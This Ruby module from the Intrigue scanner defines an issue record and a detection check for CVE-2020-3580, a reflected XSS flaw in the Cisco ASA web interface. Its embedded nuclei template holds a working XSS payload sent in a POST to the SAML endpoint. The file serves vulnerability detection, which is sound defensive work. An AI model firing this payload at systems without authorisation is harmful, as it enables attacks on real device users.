module Intrigue
  module Issue
    class CiscoAsaCve20203580 < BaseIssue
      def self.generate(instance_details = {})
        {
          added: '2021-06-24',
          name: 'cisco_asa_cve_2020_3580',
          pretty_name: 'Cisco ASA Reflected Cross-Site Scripting (CVE-2020-3580)',
          severity: 3,
          category: 'vulnerability',
          status: 'confirmed',
          description: 'Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. The vulnerabilities are due to insufficient validation of user-supplied input by the web services interface of an affected device. An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information.',
          identifiers: [
            { type: 'CVE', name: 'CVE-2020-3580' }
          ],
          affected_software: [
            { vendor: 'Cisco', product: 'Adaptive Security Appliance Software' },
            { vendor: 'Cisco', product: 'Adaptive Security Appliance Device Manager' }
          ],
          references: [
            { type: 'description', uri: 'https://twitter.com/ptswarm/status/1408050644460650502' },
            { type: 'description', uri: 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe' },
            { type: 'description', uri: 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3580' }
          ],
          authors: ['RedForce', 'Positive Technologies', 'Phil Purviance', 'pikpikcu', 'maxim']
        }.merge!(instance_details)
      end
    end
  end

  module Task
    class CiscoAsaCve20203580 < BaseCheck
      def self.check_metadata
        {
          allowed_types: ['Uri']
        }
      end

      # return truthy value to create an issue
      def check
        # run a nuclei
        uri = _get_entity_name
        template = <<-HEREDOC
        id: CVE-2020-3580

        info:
          name: Cisco ASA XSS
          author: pikpikcu
          severity: medium
          reference: |
            - https://nvd.nist.gov/vuln/detail/CVE-2020-3580
            - https://twitter.com/ptswarm/status/1408050644460650502
          description: |
            Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. The vulnerabilities are due to insufficient validation of user-supplied input by the web services interface of an affected device. An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link. A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations. For more information, see the Vulnerable Products section.
          tags: xss,cve,cve2020,cisco
        
        requests:
          - raw:
              - |
                POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
                Host: {{Hostname}}
                Content-Type: application/x-www-form-urlencoded
                Content-Length: 44
        
                SAMLResponse="><svg/onload=alert(document.domain)>
        
            matchers-condition: and
            matchers:
              - type: word
                words:
                  - '"><svg/onload=alert(document.domain)>'
                part: body
        
              - type: status
                status:
                  - 200
        HEREDOC

        # if this returns truthy value, an issue will be raised
        # the truthy value will be added as proof to the issue
        run_nuclei_template_from_string uri, template
      end
    end
  end
end
